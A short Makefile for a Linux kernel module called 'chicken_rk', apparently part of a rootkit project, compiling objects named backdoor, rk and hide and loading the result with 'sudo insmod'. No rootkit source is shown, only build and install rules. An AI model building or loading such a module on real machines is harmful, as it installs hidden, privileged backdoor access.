TARGET := chicken_rk
obj-m += $(TARGET).o
$(TARGET)-objs := backdoor.o rk.o hide.o config.o info.o utils.o virtu.o

KERNELDIR ?= /lib/modules/$(shell uname -r)/build
PWD := $(shell pwd)

EXTRA_CFLAGS += -fno-pie

ifdef DEBUG
EXTRA_CFLAGS += -DDEBUG
endif

all: DEBUG = 0
all:
	$(MAKE) -C $(KERNELDIR) M=$(PWD) modules

clean:
	$(MAKE) -C $(KERNELDIR) M=$(PWD) clean

install: all
	sudo insmod $(TARGET).ko

uninstall:
	sudo rmmod $(TARGET)

debug: DEBUG = 1
debug: 
	$(MAKE) -C $(KERNELDIR) M=$(PWD) modules

.PHONY: all clean install uninstall debug

